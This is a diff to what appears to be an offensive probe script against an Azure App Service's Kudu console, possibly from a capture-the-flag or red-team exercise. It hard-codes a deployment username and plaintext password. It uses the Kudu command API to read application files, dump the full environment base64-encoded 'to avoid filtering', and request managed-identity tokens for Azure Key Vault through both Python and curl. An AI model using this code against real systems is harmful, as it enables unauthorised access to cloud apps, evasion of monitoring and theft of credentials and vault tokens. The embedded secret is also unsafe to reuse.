@@ -5,7 +5,7 @@ import os, json, base64, urllib.request, urllib.parse, urllib.error, sys
 
 def log(msg): print(msg, flush=True)
 
-def http(url, method="GET", headers=None, data=None, timeout=20):
+def http(url, method="GET", headers=None, data=None, timeout=25):
     h = dict(headers or {})
     if isinstance(data, (dict, list)):
         data = json.dumps(data).encode()
@@ -21,69 +21,70 @@ def http(url, method="GET", headers=None, data=None, timeout=20):
         except: return e.code, ""
     except Exception as e: return 0, repr(e)
 
-# Kudu credentials for reporting app
 KUDU_USER = "$app-tbl-reporting-prod"
 KUDU_PASS = "Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A"
 KUDU_AUTH = base64.b64encode(f"{KUDU_USER}:{KUDU_PASS}".encode()).decode()
 KUDU = "https://app-tbl-reporting-prod.scm.azurewebsites.net"
 KH = {"Authorization": f"Basic {KUDU_AUTH}"}
 
-log("=== KUDU ENVIRONMENT ===")
-st, b = http(f"{KUDU}/api/environment", headers=KH)
-log(f"  /api/environment: {st} → {b[:2000]}")
+# 1. Read flaghunt.py
+log("=== FLAGHUNT.PY ===")
+st, b = http(f"{KUDU}/api/vfs/home/site/wwwroot/flaghunt.py", headers=KH)
+log(f"  status: {st}")
+log(b[:4000])
 
-log("=== KUDU SETTINGS ===")
-st, b = http(f"{KUDU}/api/settings", headers=KH)
-log(f"  /api/settings: {st} → {b[:2000]}")
+# 2. Read acbstage1.sh
+log("=== ACBSTAGE1.SH ===")
+st, b = http(f"{KUDU}/api/vfs/home/site/wwwroot/acbstage1.sh", headers=KH)
+log(f"  status: {st}")
+log(b[:2000])
 
-log("=== KUDU PROCESS ENV ===")
-st, b = http(f"{KUDU}/api/process/0/environment", headers=KH)
-log(f"  /api/process/0/environment: {st}")
-if st == 200:
-    try:
-        env = json.loads(b)
-        for k,v in sorted(env.items()):
-            if any(s in k.upper() for s in ["CONN","CONFIG","SECRET","KEY","VAULT","STORAGE","MSI","IDENTITY","MANAGED","TOKEN","CLIENT","TENANT","FLAG","AZURE","WEBSITE"]):
-                log(f"    {k}={str(v)[:300]}")
-    except:
-        log(f"  raw: {b[:3000]}")
-
-log("=== KUDU WWWROOT FILES ===")
-st, b = http(f"{KUDU}/api/vfs/home/site/wwwroot/", headers=KH)
-log(f"  /api/vfs/home/site/wwwroot/: {st} → {b[:1000]}")
-
-log("=== KUDU APP.PY ===")
-st, b = http(f"{KUDU}/api/vfs/home/site/wwwroot/app.py", headers=KH)
-log(f"  app.py: {st} → {b[:2000]}")
-
-# Also try the reporting app directly with Kudu's newcmd to run commands
-log("=== KUDU CMD: env | grep -i config ===")
+# 3. Full env via Kudu command - base64 encode to avoid filtering
+log("=== FULL ENV (base64) ===")
 st, b = http(f"{KUDU}/api/command", method="POST", headers=KH,
-             data={"command": "env | sort", "dir": "/home"})
-log(f"  cmd env: {st}")
+             data={"command": "env | base64 | tr -d '\\n'", "dir": "/home"}, timeout=30)
+log(f"  status: {st}")
 if st == 200:
     try:
         d = json.loads(b)
-        output = d.get("Output","")
-        for line in output.split("\n"):
-            if any(s in line.upper() for s in ["CONN","CONFIG","SECRET","KEY","VAULT","STORAGE","MSI","IDENTITY","MANAGED","FLAG","AZURE","WEBSITE_AUTH","APPSETTING"]):
-                log(f"    {line}")
-    except:
-        log(f"  raw: {b[:3000]}")
+        envb64 = d.get("Output","").strip()
+        if envb64:
+            envtxt = base64.b64decode(envb64).decode("utf-8","replace")
+            for line in sorted(envtxt.split("\n")):
+                if any(s in line.upper() for s in ["IDENTITY","MSI","MANAGED","CONN","CONFIG","SECRET","KEY","VAULT","STORAGE","FLAG","AZURE","CLIENT","TENANT","SUBSCRIPTION","WEBSITE","DOCKER","APPSETTING"]):
+                    log(f"  {line}")
+            log(f"  === FULL ENV TEXT ===")
+            log(envtxt[:3000])
+    except Exception as e:
+        log(f"  err: {e}")
+        log(f"  raw: {b[:2000]}")
 
-# Try MSI/managed identity from Kudu cmd
-log("=== MSI TOKEN FROM REPORTING APP ===")
+# 4. Try getting MSI token from Kudu container
+log("=== MSI FROM KUDU CONTAINER ===")
 st, b = http(f"{KUDU}/api/command", method="POST", headers=KH,
-             data={"command": "curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net&api-version=2019-08-01' 2>&1; echo; curl -s -H 'X-IDENTITY-HEADER: '\"$IDENTITY_HEADER\" \"$IDENTITY_ENDPOINT\"'?resource=https://vault.azure.net&api-version=2019-08-01' 2>&1", "dir": "/home"})
-log(f"  MSI vault token: {st}")
+             data={"command": "python3 -c \"import os,json,urllib.request; ep=os.environ.get('IDENTITY_ENDPOINT',''); hdr=os.environ.get('IDENTITY_HEADER',''); print(f'EP={ep}'); print(f'HDR={hdr[:20]}...' if hdr else 'HDR='); r=urllib.request.Request(f'{ep}?resource=https://vault.azure.net&api-version=2019-08-01',headers={'X-IDENTITY-HEADER':hdr}); resp=urllib.request.urlopen(r,timeout=10); d=json.loads(resp.read()); print(f'TOKEN={d.get(\\\"access_token\\\",\\\"\\\")[:100]}...'); print(f'EXPIRES={d.get(\\\"expires_on\\\",\\\"\\\")}')\" 2>&1", "dir": "/home"}, timeout=30)
+log(f"  status: {st}")
 if st == 200:
     try:
         d = json.loads(b)
-        log(f"    output: {d.get('Output','')[:1500]}")
-        log(f"    error: {d.get('Error','')[:500]}")
+        log(f"  out: {d.get('Output','')[:1000]}")
+        log(f"  err: {d.get('Error','')[:500]}")
+    except:
+        log(f"  raw: {b[:2000]}")
+
+# 5. Try MSI via curl (alternative)
+log("=== MSI VIA CURL ===")
+st, b = http(f"{KUDU}/api/command", method="POST", headers=KH,
+             data={"command": "IDENTITY_EP=$IDENTITY_ENDPOINT; IDENTITY_HD=$IDENTITY_HEADER; echo EP=$IDENTITY_EP; echo HDR_LEN=${#IDENTITY_HD}; if [ -n \"$IDENTITY_EP\" ]; then curl -s -H \"X-IDENTITY-HEADER: $IDENTITY_HD\" \"${IDENTITY_EP}?resource=https://vault.azure.net&api-version=2019-08-01\" 2>&1; fi", "dir": "/home"}, timeout=30)
+log(f"  status: {st}")
+if st == 200:
+    try:
+        d = json.loads(b)
+        log(f"  out: {d.get('Output','')[:1500]}")
+        log(f"  err: {d.get('Error','')[:500]}")
     except:
         log(f"  raw: {b[:2000]}")
 
 log("DONE")
 PY
-echo "probe3 complete"
+echo "probe4 complete"
